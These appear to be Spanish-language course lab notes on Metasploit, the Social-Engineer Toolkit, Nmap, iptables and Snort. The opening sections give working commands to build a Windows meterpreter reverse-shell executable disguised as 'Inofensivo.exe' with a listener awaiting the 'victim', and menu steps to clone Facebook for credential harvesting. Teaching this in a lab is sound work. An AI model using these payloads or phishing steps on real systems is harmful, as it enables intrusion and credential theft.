# exa
Metasploit

Instalación →  sudo apt-get install curl
En la línea de comandos lanzad Metasploit usando el siguiente comando → msfconsole
Para actualizar Metasploit, una vez lanzado usaremos el comando → msfupdate
Ejecutad el siguiente comando que creará un fichero ejecutable llamado Inofensivo en la carpeta personal del usuario de la máquina Linux →
 msfvenom -p windows/meterpreter/reverse_tcp --platform windows-a x86 -f exe LHOST=IPLINUX LPORT=8080-o Inofensivo.exe

Una vez que tengamos el fichero creado, lo copiamos y lo llevamos a la máquina Windows. Mientras tanto, configuraremos Metasploit a la espera de que el usuario de Windows ejecute el fichero y nos de control absoluto sobre su máquina→ 
use multi/handlerset PAYLOAD windows/meterpreter/reverse_tcpset LPORT 8080set LHOST IPLINUX

Y ejecutaremos el siguiente comando para esperar a que nuestra “víctima”ejecute el fichero Inofensivo.exe → exploit

Ingenieria Social

Tenéis las instrucciones de instalación de SET en https://github.com/trustedsec/social-engineer-toolkit/
Ejecutad SET → sudo setoolkit 
Elegid la opción 1) Social-Engineering Attacks
Elegid la opción 2) Website Attack Vectors
Elegid la opción 3) Credential Harvester Attack MethodElegid la opción 2) Site Cloner
Introducid la IP de la máquina en la que tenéis instalado SET. Si no tenéis dos máquinas conectadas en red, podéis poner 127.0.0.1
Introducid la dirección de la página web a suplantar. Por ejemplo: www.facebook.com
Abrid un navegador en una máquina que tenga acceso a la máquina donde está instalado SET. O en la propia máquina si sólo tenéis una.
Poned en el navegador la dirección IP que habéis dado al clonar el sitio (por ejemplo: 127.0.0.1)


Seguridad en redes

Nmap
Nmap es un programa de código abierto que sirve para rastrear puertos y máquinas en una red. Con Nmap se pueden descubrir fácilmente muchas características de las máquinas que están visibles en la red: qué máquinas están encendidas, que puertos tiene abiertos una máquina concreta, qué servicios está ejecutando y qué versiones de los mismos, qué sistema operativo y qué versión usa, etc.Se puede instalar Nmap como herramienta aparte, pero también viene incluida en Metasploit.En la línea de comandos lanzad Metasploit usando el siguiente comando:sudo msfconsole Una vez lanzado Metasploit podremos usar los comandos de Nmap directamente

Iptables
iptables es un módulo perteneciente al kernel de Linux que permite actuar como un firewall ya que se encarga de filtrar los paquetes de datos que entran/salen de la máquina. iptables funciona mediante reglas que tendremos que definir en función de lo que queramos hacer. Por defecto las reglas definidas no son persistentes, esto es, al reiniciar el sistema... se borran. Para evitar tener que introducir una y otra vez las mismas reglas, las reglas se pueden extraer a un fichero mediante el siguiente comando:
sudo iptables-save > /home/alumno/Escritorio/fichero 
Y tras reiniciar la máquina se pueden recuperar mediante:
sudo iptables-restore < /home/alumno/Escritorio/fichero 
Si quisiéramos que la restauración de reglas se hiciera de manera automática cada vez que se reiniciara el sistema, se podría realizar un script que se lanzara al iniciar la máquina o se puede modificar la configuración de red para que al configurar las conexiones, automáticamente restaure las reglas de iptables. Sin embargo, para este laboratorio no será necesario hacer nada de esto, es suficiente con que restauréis a mano las reglas en cada ocasión si es que no generáis todas las reglas en una única sesión.

Queremos asegurar nuestra máquina Servidor lo máximo posible por lo que vamos denegar todos los accesos del exterior excepto lo indicado a continuación. Sin embargo queremos que nuestra máquina Servidor pueda acceder a cualquier sitio

Vamos a convertir nuestra máquina es un servidor Web instalando Apache y vamos a configurarla (tanto Apache como iptables) para que permita que cualquiera se conecte a los puertos 80 (HTTP) y 443 (HTTPS).

Esto es, desde cualquier máquina (que vea a la máquina Servidor) debería poder hacerse http://IPServidory https://IPServidor y debería aparecer la página por defecto de Apache o la que configuréis

También instalaremos en nuestra máquina Servidor un servidor FTP (por ejemplo vsftpd, pero podéis usar cualquiera) y permitiremos conexiones SSH. Sin embargo, tanto al servicio FTP como al SSH sólo tendrán acceso las máquinas que estén en la misma red que la máquina Servidor. Consideraremos nuestra red el rango de direcciones IP desde el 0 hasta el 255 del último byte de la dirección IP de nuestra máquina. Esto es, si la dirección IP de Servidor fuera 168.231.100.21, las máquinas cuya IP esté en el rango168.231.100.0/255 (en este rango deberían estar tanto Sospechosa como Normal) tendrán acceso a dichos servicios. El puerto de FTP es el 21 y el de SSH el 22.
Sin embargo, en nuestra red hay un usuario del que no nos fiamos mucho, por lo que vamos a denegarle TODOS los accesos a nuestra máquina. Ese usuario es el que se conecta desde la máquina Sospechosa. Además vamos a crear un log con todos los intentos que haga de entrar en nuestra máquinaServidor para poder estudiar su comportamiento.
No queremos que nadie que tenga acceso físico a la máquina Servidor la pueda usar para acceder a redes sociales y similares, por lo que vamos a bloquear el tráfico saliente a Facebook, YouTube y Twitter, pero vamos a permitir el resto de tráfico saliente.

Snort
Para instalar Snort desde los repositorios de Ubuntu usad el siguiente comando → 
sudo apt-get install snort

Al instalar Snort (o luego al utilizarlo) os preguntará sobre qué interfaz de red queréis usarlo. Tenéis que indicarle el nombre de la interfaz de red a través de la que vais a navegar y cuyo tráfico queréis controlar. La forma más fácil de conocer el nombre de la interfaz de red es a través del comando ifconfig, mirad el nombre que le corresponde a la interfaz de red que os proporciona la IP. Las interfaces de red suelen tener nombres similares a eth0, enp0s2, etc

Snort trabaja a través de reglas, que están almacenadas en distintos ficheros en el directorio rules (/etc/snort/rules habitualmente). Para este laboratorio deberéis crear vuestro propio fichero de reglas

En el fichero de configuración de Snort (/etc/snort/snort.conf habitualmente) podéis indicar qué ficheros de reglas debe usar Snort. Tendréis que incluir el vuestro para que lo tenga en cuenta

Instalad en ambas máquinas el software necesario para que se puedan realizar conexiones SSH y FTP entre ellas.
